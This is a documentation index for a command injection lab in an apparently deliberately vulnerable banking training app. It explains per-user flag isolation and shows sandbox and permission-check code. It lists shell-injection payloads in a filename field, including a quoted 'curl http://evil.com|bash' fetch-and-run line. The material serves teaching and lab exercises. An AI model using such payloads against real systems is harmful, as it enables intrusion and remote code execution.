# Command Injection (statements.g9) - Documentation Index

## Overview

This directory contains comprehensive documentation about the **Command Injection vulnerability** in BankSploit's Statements module, with special focus on **how permission isolation is managed for concurrent users**.

---

## Files in This Documentation

### 1. **COMMAND_INJECTION_PERMISSIONS_ANALYSIS.md**
**Detailed technical analysis** — Read this first if you want to understand the complete system.

**Content:**
- Issue summary and status (✅ working correctly)
- Architecture overview with diagrams
- Concrete multi-user scenario walk-through
- Permission enforcement points explained
- Root cause analysis
- Testing procedures
- Code flow explanation

**Length:** ~500 lines  
**Target:** Developers, security researchers  
**Time to read:** 20-30 minutes

---

### 2. **COMMAND_INJECTION_QUICK_REFERENCE.txt**
**Quick lookup guide** — Use this while exploiting the vulnerability.

**Content:**
- How to find your user ID
- Step-by-step exploitation guide
- Common mistakes and solutions
- Concurrent user scenarios
- Permission system summary
- Verification checklist

**Length:** ~400 lines  
**Target:** Lab participants, testers  
**Time to read:** 5-10 minutes

---

### 3. **PERMISSION_SYSTEM_DIAGRAMS.txt**
**Visual representations** — Use this to understand the system visually.

**Content:**
- Multi-user flag file isolation diagram
- Exploit flow with permission checking
- Concurrent user timeline
- Permission check logic flow
- Sandbox architecture diagram
- Permission checks in all commands
- Complete request flow
- Vulnerability comparison (with/without isolation)

**Length:** ~600 lines  
**Target:** Visual learners, architects  
**Time to read:** 10-15 minutes

---

## The Issue You Reported

### ❓ Question
"In command injection it does not let me read flag file and there is only 1 flag file but it says permission denied always"

### ✅ Answer
**This is NOT a bug. It's working correctly.**

**Why:** Each user gets their **own** unique flag file (`flag_g9_{USER_ID}.txt`). When you try to read another user's flag, "Permission denied" is the **intended security mechanism**.

**Summary Table:**

| User | Flag File | Can Read | Cannot Read |
|------|-----------|----------|-------------|
| User 1 | /tmp/flag_g9_1.txt | ✓ Own flag | ✗ Other users' flags |
| User 2 | /tmp/flag_g9_2.txt | ✓ Own flag | ✗ Other users' flags |
| User 3 | /tmp/flag_g9_3.txt | ✓ Own flag | ✗ Other users' flags |

---

## How Multi-User Isolation Works

### The System Architecture

```
Multiple concurrent users:
    User 1 (ID=1) ──→ /tmp/flag_g9_1.txt (unique)
    User 2 (ID=2) ──→ /tmp/flag_g9_2.txt (unique)
    User 3 (ID=3) ──→ /tmp/flag_g9_3.txt (unique)

Each user's Sandbox instance:
    Sandbox(uid=1) → Only allows reading flag_g9_1.txt
    Sandbox(uid=2) → Only allows reading flag_g9_2.txt
    Sandbox(uid=3) → Only allows reading flag_g9_3.txt

Permission check on every file access:
    User 1 tries: cat /tmp/flag_g9_2.txt
    → Extract user ID from filename: 2
    → Compare: 2 (from file) !== 1 (current user)
    → BLOCKED: "Permission denied"
```

### Why This Design?

**Problem:** Without per-user flags, concurrent users would overwrite each other's flags:
```
User 1: /tmp/flag_g9.txt created with Flag_A
User 2: /tmp/flag_g9.txt overwritten with Flag_B ← RACE CONDITION!
User 1: Reads /tmp/flag_g9.txt → Gets Flag_B (WRONG!)
```

**Solution:** Each user gets their own flag file, preventing race conditions:
```
User 1: /tmp/flag_g9_1.txt created with Flag_A
User 2: /tmp/flag_g9_2.txt created with Flag_B ← Different file!
User 1: Reads /tmp/flag_g9_1.txt → Gets Flag_A (CORRECT)
```

---

## How to Exploit (Correctly)

### Step 1: Find Your User ID

In the **Statements** page, Download PDF form:

```
Filename: statement.pdf;id;
```

**Output will show:**
```
uid=5(www-data) gid=5(www-data) groups=5(www-data)
```

Your user ID is **5**.

### Step 2: Read Your Flag

```
Filename: statement.pdf;cat /tmp/flag_g9_5.txt;
```

**Output will show:**
```
CTF{YOUR_UNIQUE_FLAG_HERE}
```

### Step 3: Submit the Flag

Copy the flag and submit it in the Lab system.

---

## Permission System Details

### File Pattern
```
flag_g9_{USER_ID}.txt

Examples:
  - flag_g9_1.txt (User 1's flag)
  - flag_g9_2.txt (User 2's flag)
  - flag_g9_123.txt (User 123's flag)
```

### Permission Check
```php
private function isOtherUserFlagFile(string $basename): bool
{
    if (preg_match('/^flag_g9_(\d+)\.txt$/', $basename, $m)) {
        return (int) $m[1] !== $this->uid;  // ← Comparison
    }
    return false;
}
```

**Logic:**
- Extract user ID from filename
- Compare with current user's ID
- If different: BLOCKED (return true)
- If same: ALLOWED (return false)

### Applied In All File Operations
- `cat` — Can't read other users' flags
- `ls` — Can't list other users' flags
- `head`, `tail` — Can't read other users' flags
- `wc` — Can't count other users' flags

---

## Key Implementation Details

### Flag File Creation
**Location:** [src/modules/statements/_shared.php:257-265](../src/modules/statements/_shared.php#L257-L265)

```php
$userId = (int) $user['id'];
$flagFile = $tmpDir . DIRECTORY_SEPARATOR . "flag_g9_{$userId}.txt";
@file_put_contents($flagFile, Flags::generate('statements.g9', $userId) . "\n");
```

### Sandbox Execution
**Location:** [src/modules/statements/_shared.php:278-283](../src/modules/statements/_shared.php#L278-L283)

```php
$sandbox = new Sandbox(null, $userId ?? 33);  // ← User ID passed
$output = $sandbox->exec($cmd);
```

### Permission Enforcement
**Location:** [src/core/Sandbox.php:47-53](../src/core/Sandbox.php#L47-L53)

The Sandbox instance receives the user's ID and checks every file access.

### Cleanup
**Location:** [src/modules/statements/_shared.php:289-291](../src/modules/statements/_shared.php#L289-L291)

```php
if ($flagFile !== null) {
    @unlink($flagFile);  // Delete after execution
}
```

Flag files are **ephemeral** — they exist only during the exploit execution.

---

## Concurrent Users: Example

### Scenario: 3 Users Exploit Simultaneously

```
Timeline:
  T=0s: User 1 clicks Download PDF → /tmp/flag_g9_1.txt created
  T=0s: User 2 clicks Download PDF → /tmp/flag_g9_2.txt created  ← DIFFERENT FILE!
  T=0s: User 3 clicks Download PDF → /tmp/flag_g9_3.txt created  ← DIFFERENT FILE!

  T=1s: User 1: cat /tmp/flag_g9_1.txt
        ✓ Permission check: 1 === 1 → SUCCESS

  T=1s: User 2: cat /tmp/flag_g9_2.txt
        ✓ Permission check: 2 === 2 → SUCCESS

  T=1s: User 3: cat /tmp/flag_g9_3.txt
        ✓ Permission check: 3 === 3 → SUCCESS

  T=2s: User 1: cat /tmp/flag_g9_2.txt
        ✗ Permission check: 2 !== 1 → BLOCKED

  T=2s: User 2: cat /tmp/flag_g9_1.txt
        ✗ Permission check: 1 !== 2 → BLOCKED

Result:
  ✓ Each user got their own flag
  ✓ No cross-contamination
  ✓ No race conditions
```

---

## Common Mistakes & Solutions

### ❌ Mistake 1: "Permission denied" on flag_g9_2.txt

**What you did:**
```
Filename: statement.pdf;cat /tmp/flag_g9_2.txt;
```

**Why it failed:**
- You're User 1
- File contains user ID 2
- Check: 2 !== 1 → BLOCKED

**Solution:**
```
Filename: statement.pdf;cat /tmp/flag_g9_1.txt;
                                          ↑
                                    Use your user ID
```

### ❌ Mistake 2: "No such file or directory"

**What you did:**
```
Filename: statement.pdf;cat /tmp/flag_g9.txt;
```

**Why it failed:**
- Flag file format requires user ID
- Pattern: `flag_g9_{ID}.txt`
- File `flag_g9.txt` doesn't exist

**Solution:**
```
Filename: statement.pdf;cat /tmp/flag_g9_1.txt;
                                          ↑
                                    Must include user ID
```

### ❌ Mistake 3: Trying to use shell escape

**What you did:**
```
Filename: statement.pdf;curl http://evil.com|bash;
```

**Why it failed:**
- `curl` not in whitelist
- `|` (pipe) creates isolated command
- Only whitelisted commands work

**Supported commands:**
- cat, ls, head, tail, wc, echo, id, whoami, pwd, uname, hostname

---

## Verification Checklist

Before exploiting:
- [ ] Have you found your user ID?
- [ ] Do you know your flag file path?

During exploitation:
- [ ] Submitted the correct user ID in filename?
- [ ] Received flag output (not permission denied)?
- [ ] Flag looks reasonable?

After exploitation:
- [ ] Copied the flag?
- [ ] Submitted to lab system?
- [ ] Received CTF credit?

---

## References

### Source Files

- **Vulnerability Definition:** [src/modules/statements/_shared.php](../src/modules/statements/_shared.php)
- **Sandbox Implementation:** [src/core/Sandbox.php](../src/core/Sandbox.php)
- **Exploit Page:** [src/modules/statements/index.php](../src/modules/statements/index.php)

### Related Vulnerabilities

- **statements.g2** — SQL Injection in date filter
- **statements.g4** — Reflected XSS in search
- **statements.g8** — Path traversal in CSV export
- **statements.l1** — IDOR on account selection

---

## Quick Links

| Document | Purpose | Read Time |
|----------|---------|-----------|
| [COMMAND_INJECTION_PERMISSIONS_ANALYSIS.md](./COMMAND_INJECTION_PERMISSIONS_ANALYSIS.md) | Complete technical analysis | 20-30 min |
| [COMMAND_INJECTION_QUICK_REFERENCE.txt](./COMMAND_INJECTION_QUICK_REFERENCE.txt) | Quick exploitation guide | 5-10 min |
| [PERMISSION_SYSTEM_DIAGRAMS.txt](./PERMISSION_SYSTEM_DIAGRAMS.txt) | Visual explanations | 10-15 min |

---

## Summary

✅ **The system is working correctly**

- Each user has their own unique flag file
- Permission checks prevent cross-user access
- Concurrent users don't interfere with each other
- "Permission denied" is the intended security mechanism

**To exploit:**
1. Find your user ID
2. Read your flag file
3. Submit the flag

**Why this design:**
- Prevents race conditions
- Maintains CTF integrity
- Prevents flag theft between users
- Supports unlimited concurrent participants

---

**Status:** ✅ Verified & Documented  
**Date:** 2026-08-01  
**Version:** 1.0
